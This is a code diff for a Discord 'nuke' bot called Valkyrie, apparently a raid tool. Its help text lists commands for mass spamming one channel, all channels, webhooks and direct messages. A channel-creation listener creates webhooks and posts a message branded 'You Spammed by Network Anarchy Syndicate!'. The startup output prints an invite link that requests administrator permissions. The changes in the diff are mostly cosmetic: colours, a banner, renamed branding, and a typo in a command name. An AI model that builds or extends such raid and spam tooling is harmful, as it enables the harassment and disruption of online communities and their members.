@@ -1,22 +1,32 @@
 # coding: utf-8
 import os
 import json
-import time
 import aiohttp
 import asyncio
 import discord
-import subprocess
 import datetime
+import colorama
+import subprocess
 from utils import *
 from os import system, name
-from discord.ext import commands
-from discord.ext.commands.core import cooldown
 from discord import Permissions
+from discord.ext.commands.core import cooldown
+from colorama import Fore, Back, Style
 
 from discord.ext import (
     commands,
     tasks
 )
+
+
+dr = DR = r = R = Fore.LIGHTRED_EX
+g = G = Fore.LIGHTGREEN_EX
+b = B = Fore.LIGHTBLUE_EX
+m = M = Fore.LIGHTMAGENTA_EX
+c = C = Fore.LIGHTCYAN_EX
+y = Y = Fore.LIGHTYELLOW_EX
+w = W = Fore.RESET
+wh = WH = Fore.LIGHTWHITE_EX
 
 
 class Help(commands.Cog):
@@ -67,7 +77,7 @@ class Help(commands.Cog):
                 value = f"""឵឵
 > `{ctx.prefix}spam` - Mass sending of messages in one channel.
 > `{ctx.prefix}allspam` - Mass sending of messages in all channels.
-> `{ctx.prefix}webhook_spam` - Mass sending of messages via webhook.
+> `{ctx.prefix}wepbhook_spam` - Mass sending of messages via webhook.
 > `{ctx.prefix}dmspam <@Ping | ID>` - Mass sending of messages to the bos mentioned.\n឵឵""",
                 inline = False
             )
@@ -196,11 +206,11 @@ as this will also cause an immediate reaction of the bot, but it will not cause 
     async def on_guild_channel_create(self, channel):
 
         embed = discord.Embed(
-            title = f'''Valyrie - You Spammed by Cyber Right Sector!''',
+            title = f'''Valkyrie - You Spammed by Network Anarchy Syndicate!''',
             description = f'''{spam_text}''',
             color = 0x050404
         )
-        embed.set_image(url='https://media.discordapp.net/attachments/1083690678837588068/1090698201553707100/IMG_6839.gif') 
+        embed.set_image(url='https://media.discordapp.net/attachments/1102160843656933457/1103645963190554715/ezgif-5-03698408b2.gif') 
 
         try:
             webhook = await channel.create_webhook(name=nuke_webhook_name)
@@ -220,11 +230,16 @@ as this will also cause an immediate reaction of the bot, but it will not cause 
 
     @commands.Cog.listener()
     async def on_ready(self): # Уведомление о том, что бот запущен.
+        clear = lambda: os.system('cls')
+        clear()
+        
+        print(banner)
         print(f'''
-[] Nick: {self.client.user}
-[] Link: https://discord.com/api/oauth2/authorize?client_id={self.client.user.id}&permissions=8&scope=bot
-''')
+{Fore.RED}[] Nick: {wh}{self.client.user}
+{Fore.RED}[] Link: {wh}https://discord.com/api/oauth2/authorize?client_id={self.client.user.id}&permissions=8&scope=bot
 
+{Fore.BLUE}   ##################################################################################################{wh}
+''')
 
 
 def setup(client):
